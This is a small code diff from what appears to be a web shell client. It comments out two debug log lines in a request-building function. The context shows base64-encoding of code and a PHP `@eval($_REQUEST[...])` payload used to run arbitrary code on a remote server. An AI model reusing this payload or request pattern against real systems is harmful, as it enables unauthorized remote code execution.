@@ -87,7 +87,7 @@ export default {
     },
 
     async $genRequest(shell, code, codeParams = [], encode) {
-        console.log('codeParams:::', codeParams)
+        // console.log('codeParams:::', codeParams)
         shell.encode = 'UTF-8'
 
         if (shell.decodeType === CONST.DECODE_TYPE.NONE.VALUE) {
@@ -105,7 +105,7 @@ export default {
         }
         if (shell.encodeType === CONST.ENCODE_TYPE.BASE64) {
             let base64Str = crypto.base64Encode(code)
-            console.log(base64Str)
+            // console.log(base64Str)
             // base64Str = encodeURIComponent(base64Str)
             params = {f: 'base64_decode', p: base64Str, r: code}
             params[shell.pwd] = `@eval($_REQUEST['f']($_REQUEST['p']));`
